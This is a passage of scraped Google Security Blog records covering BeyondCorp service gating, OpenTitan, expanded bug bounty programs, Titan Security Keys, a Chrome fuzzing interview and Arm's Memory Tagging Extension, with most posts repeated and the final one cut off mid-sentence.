webinar on  Cloud OnAir  in a few months where you will be able to learn more and ask us questions.  We hope that these blog posts, research papers, and webinars will help you on your journey to enable zero trust access.     Thank you to the editors of the BeyondCorp blog post series, Puneet Goel (Product Manager), Lior Tishbi (Program Manager), and Justin McWilliams (Engineering Manager).                                    Posted by Guilherme Gonçalves, Site Reliability Engineer and Kyle O'Malley, Security Engineer    Intro This is the final post in a series of four, in which we set out to revisit various BeyondCorp topics and share lessons that were learnt along the internal implementation path at Google.  The first post in this series focused on providing necessary context for how Google adopted BeyondCorp, Google’s implementation of the zero trust security model. The second post focused on managing devices - how we decide whether or not a device should be trusted and why that distinction is necessary. The third post focused on tiered access - how to define access tiers and rules and how to simplify troubleshooting when things go wrong.  This post introduces the concept of gated services, how to identify and, subsequently, migrate them and the associated lessons we learned along the way.        High level architecture for BeyondCorp  Identifying and gating services  How do you identify and categorize all the services that should be gated? Google began as a web-based company, and as it matured in the modern era, most internal business applications were developed with a web-first approach. These applications were hosted on similar internal architecture as our external services, with the exception that they could only be accessed on corporate office networks. Thus, identifying services to be gated by BeyondCorp was made easier for us due to the fact that most internal services were already properly inventoried and hosted via standard, central solutions. Migration, in many cases, was as simple as a DNS change. Solid IT asset inventory systems and maintenance are critical to migrating to a zero trust security model.  Enforcement of zero trust access policies began with services which we determined would not be meaningfully impacted by the change in access requirements. For most services, requirements could be gathered via typical access log analysis or consulting with service owners. Services which could not be readily gated by default ACL requirements required service owners to develop strict access groups and/or eliminate risky workflows before they could be migrated.   How do you know which trust tier is needed for every service? As discussed in our previous blog post, Google makes internal services available based on device trust tiers. Today, those services are accessible by the highest trust tier by default.   When the intent of the change is to restrict access to a service to a specific group or team, service owners are free to propose access changes to add or remove restrictions to their service. Access changes which are deemed to be sufficiently low risk can be automatically approved. In all other cases, such as where the owning team wants to expose a service to a risky device tier, they must work with security engineers to follow the principle of least privilege and devise solutions.   What do you do with services that are incompatible with BeyondCorp ideals?  It may not always be possible to gate an application by the preferred zero trust solution. Services that cannot be easily gated typically fall into these categories:  Type 1: \"Non-proxyable protocols\", e.g. non-HTTP/HTTPS traffic. Type 2: Low latency requirements or localized high throughput traffic. Type 3: Administrative and emergency access networks.  The typical first step in finding a solution for these cases is finding a way to remove the need for that service altogether. In many cases, this was made possible by deprecating or replacing systems which could not be made compatible with the BeyondCorp implementation.  When that was not an option, we found that no single solution would work for all critical requirements:   Solutions for the \"Type 1\" traffic have generally involved maintaining a specialized client tunneling which strongly enforces authentication and authorization decisions on the client and the server end of the connection. This is usually client/server type traffic which is similar to HTTP traffic in that connectivity is typically multi-point to point. Solutions to the \"Type 2\" problems generally rely on moving BeyondCorp-compatible compute resources locally or developing a solution tightly integrated with network access equipment to selectively forward \"local\" traffic without permanently opening network holes. As for “Type 3,” it would be ideal to completely eliminate all privileged internal networks. However, the reality is that some privileged networking will likely always be required to maintain the network itself and also to provide emergency access during outages.  It should be noted that server-to-server traffic in secure production data center environments does not necessarily rely on BeyondCorp, although many systems are integrated regardless, due to the Service-Oriented Design benefits that BeyondCorp inherently provides.    How do you prioritize gating?  Prioritization starts by identifying all the services that are currently accessible via internal IP-access alone and migrating the most critical services to BeyondCorp, while working to slowly ratchet down permissions via exception management processes. Criticality of the service may also depend on the number and type of users, sensitivity of data handled, security and privacy risks enabled by the service.   Migration logistics  Most services required integration testing with the BeyondCorp proxy. Service teams were encouraged to stand up \"test\" services which were used to test functionality behind the BeyondCorp proxy. Most services that performed their own access control enforcement were reconfigured to instead rely on BeyondCorp for all user/group authentication and authorization. Service teams have been encouraged to develop their own \"fine-grained\" discretionary access controls in the services by leveraging session data provided by the BeyondCorp proxy.   Lessons learnt  Allow coarse gating and exceptions  Inventory: It's easy to overlook the importance of keeping a good inventory of services, devices, owners and security exceptions. The journey to a BeyondCorp world should start by solving organizational challenges when managing and maintaining data quality in inventory systems. In short, knowing how a service works, who should access it, and what makes that acceptable are the central tenets of managing BeyondCorp. Fine-grained access control is severely complicated when this insight is missing.  Legacy protocols: Most large enterprises will inevitably need to support workflows and protocols which cannot be migrated to a BeyondCorp world (in any reasonable amount of time). Exception management and service inventory become crucial at this stage while stakeholders develop solutions.  Run highly reliable systems The BeyondCorp initiative would not be sustainable at Google’s scale without the involvement of various Site Reliability Engineering (SRE) teams across the inventory systems, BeyondCorp infrastructure and client side solutions. The ability to successfully achieve wide-spread adoption of changes this large can be hampered by perceived (or in some cases, actual) reliability issues. Understanding the user workflows that might be impacted, working with key stakeholders and ensuring the transition is smooth and trouble-free  for all users helps protect against backlash and avoids users finding undesirable workarounds. By applying our reliability engineering practices, those teams helped to ensure that the components of our implementation all have availability and latency targets, operational robustness, etc. These are compatible with our business needs and intended user experiences.   Put employees in control as much as possible  Employees cover a broad range of job functions with varying requirements of technology and tools. In addition to communicating changes to our employees early, we provide them with self-service solutions for handling exceptions or addressing issues affecting their devices. By putting our employees in control, we help to ensure that security mechanisms do not get in their way, helping with the acceptance and scaling processes.   Summary  Throughout this series of blog posts, we set out to revisit and demystify BeyondCorp, Google’s internal implementation of a zero trust security model. The four posts had different focus areas - setting context, devices, tiered access and, finally, services (this post).  If you want to learn more, you can check out the BeyondCorp research papers. In addition, getting started with BeyondCorp is now easier using zero trust solutions from Google Cloud (context-aware access) and other enterprise providers. Lastly, stay tuned for an upcoming BeyondCorp webinar on Cloud OnAir in a few months where you will be able to learn more and ask us questions.  We hope that these blog posts, research papers, and webinars will help you on your journey to enable zero trust access.  Thank you to the editors of the BeyondCorp blog post series, Puneet Goel (Product Manager), Lior Tishbi (Program Manager), and Justin McWilliams (Engineering Manager).     ", "date": "October 31, 2019"},
{"website": "Google-Security", "title": "\nOpenTitan - open sourcing transparent, trustworthy, and secure silicon\n", "author": ["Posted by Royal Hansen, Vice President, Google and Dominic Rizzo, OpenTitan Lead, Google Cloud "], "link": "https://security.googleblog.com/2019/11/opentitan-open-sourcing-transparent.html", "abstract": "                             Posted by Royal Hansen, Vice President, Google and Dominic Rizzo, OpenTitan Lead, Google Cloud&nbsp;       Security begins with secure infrastructure. To have higher confidence in the security and integrity of the infrastructure, we need to anchor our trust at the foundation - in a special-purpose chip.        Today, along with our partners, we are excited to announce  OpenTitan  - the first open source silicon root of trust (RoT) project. OpenTitan will deliver a high-quality RoT design and integration guidelines for use in data center servers, storage, peripherals, and more. Open sourcing the silicon design makes it more transparent, trustworthy, and ultimately, secure.                     The OpenTitan logo              Anchoring trust in silicon     Silicon RoT can help ensure that the hardware infrastructure and the software that runs on it remain in their intended, trustworthy state by verifying that the critical system components boot securely using authorized and verifiable code. Silicon RoT can provide many security benefits by helping to:        Ensure that a server or a device boots with the correct firmware and hasn't been infected by a low-level malware.     Provide a cryptographically unique machine identity, so an operator can verify that a server or a device is legitimate.     Protect secrets like encryption keys in a tamper-resistant way even for people with physical access (e.g., while a server or a device is being shipped).     Provide authoritative, tamper-evident audit records and other runtime security services.         The silicon RoT technology can be used in server motherboards, network cards, client devices (e.g., laptops, phones), consumer routers, IoT devices, and more. For example, Google has relied on a custom-made RoT chip,  Titan , to help ensure that machines in Google&#8217;s data centers boot from a known trustworthy state with verified code; it is our system root of trust. Recognizing the importance of anchoring the trust in silicon, together with our partners we want to spread the benefits of reliable silicon RoT chips to our customers and the rest of the industry. We believe that the best way to accomplish that is through open source silicon.         Raising the transparency and security bar       Similar to open source software, open source silicon can:       Enhance trust and security through design and implementation transparency. Issues can be discovered early, and the need for blind trust is reduced.   Enable and encourage innovation through contributions to the open source design.   Provide implementation choice and preserve a set of common interfaces and software compatibility guarantees through a common, open reference design.    The OpenTitan project is managed by the  lowRISC CIC , an independent not-for-profit company with a full-stack engineering team based in Cambridge, UK, and is supported by a coalition of like-minded partners, including  ETH Zurich ,  G+D Mobile Security ,  Google ,  Nuvoton Technology , and  Western Digital .                           The founding partners of the OpenTitan project          OpenTitan is an active engineering project staffed by a team of engineers representing a coalition of partners who bring ideas and expertise from many perspectives. We are transparently building the logical design of a silicon RoT, including an open source microprocessor (the  lowRISC Ibex , a RISC-V-based design), cryptographic coprocessors, a hardware random number generator, a sophisticated key hierarchy, memory hierarchies for volatile and non-volatile storage, defensive mechanisms, IO peripherals, secure boot, and more.  With OpenTitan, a coalition of partners have come together to deliver a more open, transparent, and high-quality RoT.                           A comparison of the major design components of a traditional RoT and an OpenTitan RoT        The OpenTitan project is rooted in three key principles:     Transparency - anyone can inspect, evaluate, and contribute to OpenTitan&#8217;s design and documentation to help build more transparent, trustworthy silicon RoT for all.   High quality - we are building a high-quality logically-secure silicon design, including reference firmware, verification collateral, and technical documentation.   Flexibility - adopters can reduce costs and reach more customers by using a vendor- and platform-agnostic silicon RoT design that can be integrated into data center servers, storage, peripheral and other devices.         Participating in the OpenTitan project   OpenTitan will be helpful for chip manufacturers, platform providers, and security-conscious enterprise organizations that want to enhance their infrastructure with silicon-based security. Visit our  GitHub repository  today.    If you are interested in actively collaborating on OpenTitan to help make secure open source silicon a reality, we encourage you to  contact  the OpenTitan team. If you would like your product to be considered for a pilot OpenTitan RoT integration, the team would be excited to  hear  from you.                                     Posted by Royal Hansen, Vice President, Google and Dominic Rizzo, OpenTitan Lead, Google Cloud   Security begins with secure infrastructure. To have higher confidence in the security and integrity of the infrastructure, we need to anchor our trust at the foundation - in a special-purpose chip.   Today, along with our partners, we are excited to announce OpenTitan - the first open source silicon root of trust (RoT) project. OpenTitan will deliver a high-quality RoT design and integration guidelines for use in data center servers, storage, peripherals, and more. Open sourcing the silicon design makes it more transparent, trustworthy, and ultimately, secure.       The OpenTitan logo     Anchoring trust in silicon Silicon RoT can help ensure that the hardware infrastructure and the software that runs on it remain in their intended, trustworthy state by verifying that the critical system components boot securely using authorized and verifiable code. Silicon RoT can provide many security benefits by helping to:  Ensure that a server or a device boots with the correct firmware and hasn't been infected by a low-level malware. Provide a cryptographically unique machine identity, so an operator can verify that a server or a device is legitimate. Protect secrets like encryption keys in a tamper-resistant way even for people with physical access (e.g., while a server or a device is being shipped). Provide authoritative, tamper-evident audit records and other runtime security services.   The silicon RoT technology can be used in server motherboards, network cards, client devices (e.g., laptops, phones), consumer routers, IoT devices, and more. For example, Google has relied on a custom-made RoT chip, Titan, to help ensure that machines in Google’s data centers boot from a known trustworthy state with verified code; it is our system root of trust. Recognizing the importance of anchoring the trust in silicon, together with our partners we want to spread the benefits of reliable silicon RoT chips to our customers and the rest of the industry. We believe that the best way to accomplish that is through open source silicon.    Raising the transparency and security bar   Similar to open source software, open source silicon can:   Enhance trust and security through design and implementation transparency. Issues can be discovered early, and the need for blind trust is reduced. Enable and encourage innovation through contributions to the open source design. Provide implementation choice and preserve a set of common interfaces and software compatibility guarantees through a common, open reference design.  The OpenTitan project is managed by the lowRISC CIC, an independent not-for-profit company with a full-stack engineering team based in Cambridge, UK, and is supported by a coalition of like-minded partners, including ETH Zurich, G+D Mobile Security, Google, Nuvoton Technology, and Western Digital.           The founding partners of the OpenTitan project    OpenTitan is an active engineering project staffed by a team of engineers representing a coalition of partners who bring ideas and expertise from many perspectives. We are transparently building the logical design of a silicon RoT, including an open source microprocessor (the lowRISC Ibex, a RISC-V-based design), cryptographic coprocessors, a hardware random number generator, a sophisticated key hierarchy, memory hierarchies for volatile and non-volatile storage, defensive mechanisms, IO peripherals, secure boot, and more.  With OpenTitan, a coalition of partners have come together to deliver a more open, transparent, and high-quality RoT.           A comparison of the major design components of a traditional RoT and an OpenTitan RoT    The OpenTitan project is rooted in three key principles:  Transparency - anyone can inspect, evaluate, and contribute to OpenTitan’s design and documentation to help build more transparent, trustworthy silicon RoT for all. High quality - we are building a high-quality logically-secure silicon design, including reference firmware, verification collateral, and technical documentation. Flexibility - adopters can reduce costs and reach more customers by using a vendor- and platform-agnostic silicon RoT design that can be integrated into data center servers, storage, peripheral and other devices.     Participating in the OpenTitan project OpenTitan will be helpful for chip manufacturers, platform providers, and security-conscious enterprise organizations that want to enhance their infrastructure with silicon-based security. Visit our GitHub repository today.  If you are interested in actively collaborating on OpenTitan to help make secure open source silicon a reality, we encourage you to contact the OpenTitan team. If you would like your product to be considered for a pilot OpenTitan RoT integration, the team would be excited to hear from you.     ", "date": "November 5, 2019"},
{"website": "Google-Security", "title": "\nExpanding bug bounties on Google Play\n", "author": [], "link": "https://security.googleblog.com/2019/08/expanding-bug-bounties-on-google-play.html", "abstract": "                               Posted by Adam Bacchus, Sebastian Porst, and Patrick Mutchler&#8202;&#8212;&#8202;Android Security & Privacy       [Cross-posted from the  Android Developers Blog ]             We&#8217;re constantly looking for ways to further improve the security and privacy of our products, and the ecosystems they support. At Google, we understand the strength of open platforms and ecosystems, and that the best ideas don&#8217;t always come from within. It is for this reason that we offer a broad range of vulnerability reward programs, encouraging the community to help us improve security for everyone. Today, we&#8217;re expanding on those efforts with some big changes to  Google Play Security Reward Program (GPSRP) , as well as the launch of the new  Developer Data Protection Reward Program (DDPRP) .     Google Play Security Reward Program Scope Increases       We are increasing the scope of GPSRP to include all apps in Google Play with 100 million or more installs. These apps are now eligible for rewards, even if the app developers don&#8217;t have their own vulnerability disclosure or bug bounty program. In these scenarios, Google helps responsibly disclose identified vulnerabilities to the affected app developer. This opens the door for security researchers to help hundreds of organizations identify and fix vulnerabilities in their apps. If the developers already have their own programs, researchers can collect rewards directly from them on top of the rewards from Google. We encourage app developers to start their own vulnerability disclosure or bug bounty program to work directly with the security researcher community.     Vulnerability data from GPSRP helps Google create automated checks that scan all apps available in Google Play for similar vulnerabilities. Affected app developers are notified through the Play Console as part of the  App Security Improvement (ASI)  program, which provides information on the vulnerability and how to fix it. Over its lifetime, ASI has helped more than 300,000 developers fix more than 1,000,000 apps on Google Play. In 2018 alone, the program helped over 30,000 developers fix over 75,000 apps. The downstream effect means that those 75,000 vulnerable apps are not distributed to users until the issue is fixed.     To date, GPSRP has paid out over $265,000 in bounties. Recent scope and  reward increases  have resulted in $75,500 in rewards across July & August alone. With these changes, we anticipate even further engagement from the security research community to bolster the success of the program.     Introducing the Developer Data Protection Reward Program       Today, we are also launching the  Developer Data Protection Reward Program . DDPRP is a bounty program, in collaboration with HackerOne, meant to identify and mitigate data abuse issues in Android apps, OAuth projects, and Chrome extensions. It  recognizes  the contributions of individuals who help report apps that are violating Google Play, Google API, or Google Chrome Web Store Extensions program policies.     The program aims to reward anyone who can provide verifiably and unambiguous evidence of data abuse, in a similar model as Google&#8217;s other vulnerability reward programs. In particular, the program aims to identify situations where user data is being used or sold unexpectedly, or repurposed in an illegitimate way without user consent. If data abuse is identified related to an app or Chrome extension, that app or extension will accordingly be removed from Google Play or Google Chrome Web Store. In the case of an app developer abusing access to Gmail restricted scopes, their API access will be removed. While no reward table or maximum reward is listed at this time, depending on impact, a single report could net as large as a $50,000 bounty.     As 2019 continues, we look forward to seeing what researchers find next. Thank you to the entire community for contributing to keeping our platforms and ecosystems safe. Happy bug hunting!                                         Posted by Adam Bacchus, Sebastian Porst, and Patrick Mutchler — Android Security & Privacy   [Cross-posted from the Android Developers Blog]      We’re constantly looking for ways to further improve the security and privacy of our products, and the ecosystems they support. At Google, we understand the strength of open platforms and ecosystems, and that the best ideas don’t always come from within. It is for this reason that we offer a broad range of vulnerability reward programs, encouraging the community to help us improve security for everyone. Today, we’re expanding on those efforts with some big changes to Google Play Security Reward Program (GPSRP), as well as the launch of the new Developer Data Protection Reward Program (DDPRP).  Google Play Security Reward Program Scope Increases    We are increasing the scope of GPSRP to include all apps in Google Play with 100 million or more installs. These apps are now eligible for rewards, even if the app developers don’t have their own vulnerability disclosure or bug bounty program. In these scenarios, Google helps responsibly disclose identified vulnerabilities to the affected app developer. This opens the door for security researchers to help hundreds of organizations identify and fix vulnerabilities in their apps. If the developers already have their own programs, researchers can collect rewards directly from them on top of the rewards from Google. We encourage app developers to start their own vulnerability disclosure or bug bounty program to work directly with the security researcher community.   Vulnerability data from GPSRP helps Google create automated checks that scan all apps available in Google Play for similar vulnerabilities. Affected app developers are notified through the Play Console as part of the App Security Improvement (ASI) program, which provides information on the vulnerability and how to fix it. Over its lifetime, ASI has helped more than 300,000 developers fix more than 1,000,000 apps on Google Play. In 2018 alone, the program helped over 30,000 developers fix over 75,000 apps. The downstream effect means that those 75,000 vulnerable apps are not distributed to users until the issue is fixed.   To date, GPSRP has paid out over $265,000 in bounties. Recent scope and reward increases have resulted in $75,500 in rewards across July & August alone. With these changes, we anticipate even further engagement from the security research community to bolster the success of the program.  Introducing the Developer Data Protection Reward Program    Today, we are also launching the Developer Data Protection Reward Program. DDPRP is a bounty program, in collaboration with HackerOne, meant to identify and mitigate data abuse issues in Android apps, OAuth projects, and Chrome extensions. It recognizes the contributions of individuals who help report apps that are violating Google Play, Google API, or Google Chrome Web Store Extensions program policies.   The program aims to reward anyone who can provide verifiably and unambiguous evidence of data abuse, in a similar model as Google’s other vulnerability reward programs. In particular, the program aims to identify situations where user data is being used or sold unexpectedly, or repurposed in an illegitimate way without user consent. If data abuse is identified related to an app or Chrome extension, that app or extension will accordingly be removed from Google Play or Google Chrome Web Store. In the case of an app developer abusing access to Gmail restricted scopes, their API access will be removed. While no reward table or maximum reward is listed at this time, depending on impact, a single report could net as large as a $50,000 bounty.   As 2019 continues, we look forward to seeing what researchers find next. Thank you to the entire community for contributing to keeping our platforms and ecosystems safe. Happy bug hunting!        ", "date": "August 29, 2019"},
{"website": "Google-Security", "title": "\nTitan Security Keys are now available in Canada, France, Japan, and the UK\n", "author": [], "link": "https://security.googleblog.com/2019/07/titan-security-keys-are-now-available.html", "abstract": "                                Posted by Christiaan Brand, Product Manager, Google Cloud              Credential compromise as a result of phishing is one of the most common causes of security breaches. Security keys provide the   strongest   protection against these types of attacks, and that&#8217;s one of the main reasons why Google requires them as a second factor of authentication for our employees.           Last year, we   launched   Titan Security Keys in the United States and were excited to see strong demand from users and businesses choosing to protect their personal and work Google Accounts. Starting today, Titan Security Keys are also available on the   Google Store   in Canada, France, Japan, and the United Kingdom (UK).                                    Titan Security Keys                      Titan Security Keys   are built with a hardware chip that includes firmware engineered by Google to verify the keys&#8217; integrity. Each key leverages   FIDO   standards to cryptographically verify your identity and URL of the login page, preventing an attacker from accessing your account even if you are tricked into providing your username and password. Security keys are appropriate for any security-conscious user or enterprise, and we recommend that all users, especially those at higher risk such as IT administrators, executives, politicians, and activists consider signing in via security keys.           Bundles of two Titan Security Keys (one USB/NFC and one Bluetooth) are available on the   Google Store   in Canada, France, Japan, and the UK in addition to the US. To set up your security keys with your personal or work Google Account, sign in and navigate to the   2-Step Verification   page. In addition, you can enroll in the   Advanced Protection Program  , which provides Google&#8217;s strongest security for anyone at risk of targeted attacks. Titan Security Keys can also be used anywhere FIDO security keys are supported, including   Coinbase  ,   Dropbox  ,   Facebook  ,   GitHub  ,   Salesforce  ,   Stripe  ,   Twitter  , and more         Enterprise administrators can  require security keys  for their users in G Suite and Google Cloud Platform (GCP).  Bulk orders  of unbundled Titan Security Keys are available in Canada, Japan, and the US.                                        Posted by Christiaan Brand, Product Manager, Google Cloud    Credential compromise as a result of phishing is one of the most common causes of security breaches. Security keys provide the strongest protection against these types of attacks, and that’s one of the main reasons why Google requires them as a second factor of authentication for our employees.   Last year, we launched Titan Security Keys in the United States and were excited to see strong demand from users and businesses choosing to protect their personal and work Google Accounts. Starting today, Titan Security Keys are also available on the Google Store in Canada, France, Japan, and the United Kingdom (UK).         Titan Security Keys       Titan Security Keys are built with a hardware chip that includes firmware engineered by Google to verify the keys’ integrity. Each key leverages FIDO standards to cryptographically verify your identity and URL of the login page, preventing an attacker from accessing your account even if you are tricked into providing your username and password. Security keys are appropriate for any security-conscious user or enterprise, and we recommend that all users, especially those at higher risk such as IT administrators, executives, politicians, and activists consider signing in via security keys.   Bundles of two Titan Security Keys (one USB/NFC and one Bluetooth) are available on the Google Store in Canada, France, Japan, and the UK in addition to the US. To set up your security keys with your personal or work Google Account, sign in and navigate to the 2-Step Verification page. In addition, you can enroll in the Advanced Protection Program, which provides Google’s strongest security for anyone at risk of targeted attacks. Titan Security Keys can also be used anywhere FIDO security keys are supported, including Coinbase, Dropbox, Facebook, GitHub, Salesforce, Stripe, Twitter, and more  Enterprise administrators can require security keys for their users in G Suite and Google Cloud Platform (GCP). Bulk orders of unbundled Titan Security Keys are available in Canada, Japan, and the US.      ", "date": "July 31, 2019"},
{"website": "Google-Security", "title": "\nChrome Fuzzer Program Update And How-To\n", "author": ["Posted by Max Moroz, Fuzzing Evangelist, and Ned Williamson, Fuzzing Entrepreneur"], "link": "https://security.googleblog.com/2019/07/chrome-fuzzer-program-update-and-how-to.html", "abstract": "                             Posted by Max Moroz, Fuzzing Evangelist, and Ned Williamson, Fuzzing Entrepreneur      TL;DR  We increased the Chrome Fuzzer Program bonus from $500 to $1,000 as part of our recent  update of reward amounts .      Chrome Fuzzer Program  is a part of the Google Chrome Vulnerability Reward Program that lets security researchers run their fuzzers at scale on the  ClusterFuzz  infrastructure. It makes bug reporting fully automated, and the fuzzer authors get the same rewards as if they reported the bugs manually, plus an extra bonus ($1,000 as of now) on top of it for every new vulnerability.     We run fuzzers indefinitely, and some of the fuzzers contributed years ago are still finding security issues in ever changing Chrome code. This is a win-win for both sides, as security researchers do not have to spend time analyzing the crashes, and Chrome developers receive high quality bug reports automatically.     To learn more about the Chrome Fuzzer Program, let&#8217;s talk to Ned Williamson, who&#8217;s been a participant since 2017 and now works on the Google Security team.      Q:  Hey Ned! It looks like you&#8217;ve received over $50,000 by participating in the Google Chrome Vulnerability Reward Program with your  quic_stream_factory_fuzzer .       A:  Yes, it&#8217;s true. I wrote a fuzzer for QUIC which helped me find and report two critical vulnerabilities, each worth $10,000. Because I knew my fuzzer worked well, I submitted it to the Chrome Fuzzer Program. Then, in the next few months, I received that reward three more times (plus a bonus), as the fuzzer caught several security regressions on ClusterFuzz soon after they happened.      Q:  Have you intentionally focused on the areas that yield  higher severity  issues and bigger rewards?      A:  Yes. While vulnerabilities in code that is more critical to user security yield larger reward amounts, I actually started by looking at lower severity bugs and incrementally began looking for more severe bugs until I could find critical ones. You can see this progression by looking at the  bugs I reported manually  as an external researcher.      Q:  Would you suggest starting by looking for non-critical bugs?      A:  I would say so. Security-critical code is generally better designed and more thoroughly audited, so it might be discouraging to start from there. Finding less critical security bugs and winning bounties is a good way to build confidence and stay motivated.      Q:  Can you share an algorithm on how to find security bugs in Chrome?      A:  Looking at previous and existing bug reports, even for non-security crashes, is a great way to tell which code is security-critical and potentially buggy. From there, if some code looks like it&#8217;s exposed to user inputs, I&#8217;d set up a fuzzing campaign against that component. After you gain experience you will not need to rely on existing reports to find new attack surface, which in turn helps you find places that have not been considered by previous researchers. This was the case for my QUIC fuzzer.      Q:  How did you learn to write fuzzers?      A:  I didn&#8217;t have any special knowledge about fuzzing before I started looking for vulnerabilities in Chrome. I followed the  documentation  in the repository and I still follow the same process today.      Q:   Your fuzzer  isn&#8217;t very simple compared to  many other fuzzers . How did you get to that implementation?      A:  The key insight in the QUIC fuzzer was realizing that the parts of the code that handled plaintext messages after decryption were prone to memory corruption. Typically, fuzzing does not perform well with encrypted inputs (it&#8217;s pretty hard to &#8220;randomly&#8221; generate a packet that can be successfully decrypted), so I extended the QUIC testing code to allow for testing with encryption disabled.      Q : Are there any other good examples of fuzz targets employing a similar logic?      A : Another example is  pdf_formcalc_context_fuzzer  that wraps the fuzzing input around with a valid hardcoded PDF file, therefore focusing fuzzing only on the XFA script part of it. As a researcher, you just need to choose what exactly you want to fuzz, and then understand how to execute that code properly. Looking at the unit tests is usually the easiest way to get such an understanding.     Useful links:        Fuzzing documentation     Existing fuzz targets     Fuzzing coverage dashboard     Medium+ severity bugs reported via Chrome VRP        Happy fuzzing and bug hunting!                                     Posted by Max Moroz, Fuzzing Evangelist, and Ned Williamson, Fuzzing Entrepreneur   TL;DR We increased the Chrome Fuzzer Program bonus from $500 to $1,000 as part of our recent update of reward amounts.   Chrome Fuzzer Program is a part of the Google Chrome Vulnerability Reward Program that lets security researchers run their fuzzers at scale on the ClusterFuzz infrastructure. It makes bug reporting fully automated, and the fuzzer authors get the same rewards as if they reported the bugs manually, plus an extra bonus ($1,000 as of now) on top of it for every new vulnerability.   We run fuzzers indefinitely, and some of the fuzzers contributed years ago are still finding security issues in ever changing Chrome code. This is a win-win for both sides, as security researchers do not have to spend time analyzing the crashes, and Chrome developers receive high quality bug reports automatically.   To learn more about the Chrome Fuzzer Program, let’s talk to Ned Williamson, who’s been a participant since 2017 and now works on the Google Security team.   Q: Hey Ned! It looks like you’ve received over $50,000 by participating in the Google Chrome Vulnerability Reward Program with your quic_stream_factory_fuzzer.    A: Yes, it’s true. I wrote a fuzzer for QUIC which helped me find and report two critical vulnerabilities, each worth $10,000. Because I knew my fuzzer worked well, I submitted it to the Chrome Fuzzer Program. Then, in the next few months, I received that reward three more times (plus a bonus), as the fuzzer caught several security regressions on ClusterFuzz soon after they happened.   Q: Have you intentionally focused on the areas that yield higher severity issues and bigger rewards?   A: Yes. While vulnerabilities in code that is more critical to user security yield larger reward amounts, I actually started by looking at lower severity bugs and incrementally began looking for more severe bugs until I could find critical ones. You can see this progression by looking at the bugs I reported manually as an external researcher.   Q: Would you suggest starting by looking for non-critical bugs?   A: I would say so. Security-critical code is generally better designed and more thoroughly audited, so it might be discouraging to start from there. Finding less critical security bugs and winning bounties is a good way to build confidence and stay motivated.   Q: Can you share an algorithm on how to find security bugs in Chrome?   A: Looking at previous and existing bug reports, even for non-security crashes, is a great way to tell which code is security-critical and potentially buggy. From there, if some code looks like it’s exposed to user inputs, I’d set up a fuzzing campaign against that component. After you gain experience you will not need to rely on existing reports to find new attack surface, which in turn helps you find places that have not been considered by previous researchers. This was the case for my QUIC fuzzer.   Q: How did you learn to write fuzzers?   A: I didn’t have any special knowledge about fuzzing before I started looking for vulnerabilities in Chrome. I followed the documentation in the repository and I still follow the same process today.   Q: Your fuzzer isn’t very simple compared to many other fuzzers. How did you get to that implementation?   A: The key insight in the QUIC fuzzer was realizing that the parts of the code that handled plaintext messages after decryption were prone to memory corruption. Typically, fuzzing does not perform well with encrypted inputs (it’s pretty hard to “randomly” generate a packet that can be successfully decrypted), so I extended the QUIC testing code to allow for testing with encryption disabled.   Q: Are there any other good examples of fuzz targets employing a similar logic?   A: Another example is pdf_formcalc_context_fuzzer that wraps the fuzzing input around with a valid hardcoded PDF file, therefore focusing fuzzing only on the XFA script part of it. As a researcher, you just need to choose what exactly you want to fuzz, and then understand how to execute that code properly. Looking at the unit tests is usually the easiest way to get such an understanding.   Useful links:    Fuzzing documentation  Existing fuzz targets  Fuzzing coverage dashboard  Medium+ severity bugs reported via Chrome VRP    Happy fuzzing and bug hunting!      ", "date": "July 30, 2019"},
{"website": "Google-Security", "title": "\nAdopting the Arm Memory Tagging Extension in Android\n", "author": ["Posted by Kostya Serebryany, Google Core Systems, and Sudhi Herle, Android Security & Privacy Team"], "link": "https://security.googleblog.com/2019/08/adopting-arm-memory-tagging-extension.html", "abstract": "                             Posted by Kostya Serebryany, Google Core Systems, and Sudhi Herle, Android Security & Privacy Team     As part of our continuous commitment to improve the security of the Android ecosystem, we are partnering with Arm to design the  memory tagging extension  (MTE).  Memory safety bugs , common in C and C++, remain one of the largest vulnerabilities in the Android platform and although there have been previous  hardening efforts , memory safety bugs comprised more than half of the high priority security bugs in Android 9. Additionally, memory safety bugs manifest as hard to diagnose reliability problems, including sporadic crashes or silent data corruption. This reduces user satisfaction and  increases the cost of software development . Software testing tools, such as  ASAN  and  HWASAN  help, but their applicability on current hardware is limited due to noticeable overheads.     MTE, a hardware feature, aims to further mitigate these memory safety bugs by enabling us to detect them with low overhead. It has two execution modes:         Precise mode : Provides more detailed information about the memory violation    Imprecise mode : Has lower CPU overhead and is more suitable to be always-on.        Arm recently published a  whitepaper on MTE  and has added documentation to the Arm v8.5  Architecture Reference Manual .      We envision several different usage modes for MTE.        MTE provides a version of  ASAN / HWASAN  that is easier to use for testing and fuzzing in laboratory environments. It will find more bugs in a fraction of the time and at a lower cost, reducing the complexity of the development process. In many cases, MTE will allow testing memory safety using the same binary as shipped to production. The bug reports produced by MTE will be as detailed and actionable as those from ASAN and HWASAN.    MTE will be used as a mechanism for testing complex software scenarios in production. App Developers and OEMs will be able to selectively turn on MTE for parts of the software stack. Where users have provided consent, bug reports will be available to developers via familiar mechanisms like  Google Play Console .    MTE can be used as a strong security mitigation in the Android System and applications for many classes of memory safety bugs. For most instances of such vulnerabilities, a probabilistic mitigation based on MTE could prevent exploitation with a higher than 90% chance of detecting each invalid memory access. By implementing these protections and ensuring that attackers can't make repeated attempts to exploit security-critical components, we can significantly reduce the risk to users posed by memory safety issues.        We believe that memory tagging will detect the most common classes of memory safety bugs in the wild, helping vendors identify and fix them, discouraging malicious actors from exploiting them. During the past year, our team has been working to ensure readiness of the Android platform and application software for MTE. We have deployed HWASAN, a software implementation of the memory tagging concept, to test our entire platform and a few select apps. This deployment has uncovered close to 100 memory safety bugs. The majority of these bugs were detected on HWASAN enabled phones in everyday use. MTE will greatly improve upon this in terms of overhead, ease of deployment, and scale. In parallel, we have been working on supporting MTE  in the LLVM compiler toolchain  and  in the Linux kernel . The Android platform support for MTE will be complete by the time of silicon availability.      Google is committed to supporting MTE throughout the Android software stack. We are working with select Arm System On Chip (SoC) partners to test MTE support and look forward to wider deployment of MTE in the Android software and hardware ecosystem. Based on the current data points, MTE provides tremendous benefits at acceptable performance costs. We are considering MTE as a possible foundational requirement for certain tiers of Android devices.       Thank you to Mitch Phillips, Evgenii Stepanov, Vlad Tsyrklevich, Mark Brand, and Serban Constantinescu for their contributions to this post.                                      Posted by Kostya Serebryany, Google Core Systems, and Sudhi Herle, Android Security & Privacy Team   As part of our continuous commitment to improve the security of the Android ecosystem, we are partnering with Arm to design the memory tagging extension (MTE). Memory safety 